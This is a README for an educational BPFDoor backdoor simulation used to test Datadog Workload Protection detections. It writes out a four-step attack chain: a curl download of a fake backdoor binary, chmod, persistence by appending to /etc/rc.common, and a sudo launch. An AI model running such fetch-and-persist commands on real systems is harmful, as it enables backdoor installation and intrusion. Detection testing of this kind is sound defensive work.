# BPFDoor Simulation - Network Backdoor Attack

## Abstract

This educational security simulation demonstrates a **BPFDoor network backdoor attack** that exploits a command injection vulnerability in a web application. The attack follows a four-stage methodology that mirrors real-world backdoor deployment techniques:

1. **Payload Delivery**: Downloads a simulated BPFDoor backdoor binary from a remote repository using command injection
2. **Privilege Escalation**: Sets execution permissions on the downloaded backdoor binary
3. **Persistence**: Establishes startup persistence by adding the backdoor to system initialization files
4. **Execution**: Launches the simulated backdoor which masquerades as a legitimate system process and establishes covert network communication channels

The simulation showcases how attackers can compromise web applications through command injection vulnerabilities, deploy persistent network backdoors, and establish covert communication channels using BPF (Berkeley Packet Filter) technology. This demonstration is designed to help security professionals understand attack methodologies and evaluate Datadog's Workload Protection capabilities in detecting and alerting on such threats.

**⚠️ Important**: This is a simulation using harmless demo binaries for educational purposes only.

## Attack Scenario Details

### Vulnerability Exploited
- **Command Injection**: Allows execution of arbitrary commands on the target server

### Attack Flow
1. **Initial Compromise**: Exploit command injection to download simulated BPFDoor backdoor
   ```bash
   curl -OL https://github.com/spikat/fake-bpfdoor/raw/refs/heads/main/fake-bpfdoor.x64
   ```

2. **Privilege Escalation**: Make backdoor executable
   ```bash
   chmod +x fake-bpfdoor.x64
   ```

3. **Persistence**: Add to startup configuration for survival across reboots
   ```bash
   bash -c 'echo /var/www/html/fake-bpfdoor.x64 >> /etc/rc.common'
   ```

4. **Backdoor Activation**: Execute the network backdoor which establishes covert communication
   ```bash
   sudo /var/www/html/fake-bpfdoor.x64
   ```

### BPFDoor Technical Details
- **Process Masquerading**: Disguises itself as legitimate system process (`haldrund`)
- **Daemonization**: Detaches from terminal and runs as background service
- **BPF Filtering**: Uses complex 251-instruction BPF filter to analyze network packets
- **Raw Sockets**: Captures network traffic using raw TCP sockets
- **Magic Signature**: Responds to packets containing signature `960051513`
- **Covert Communication**: Establishes backdoor communication channel through network traffic

## Usage

1. Run the attack simulation: `kubectl exec -it deploy/playground-app -- /scripts/fake-bpfdoor/detonate.sh --wait`
2. Monitor detection in Datadog Workload Protection App

## Security Notice

This simulation uses **harmless demo binaries** and should only be run in isolated, educational environments. All backdoor components are fake and designed for demonstration purposes only. The simulated BPFDoor contains no malicious functionality and is purely educational.
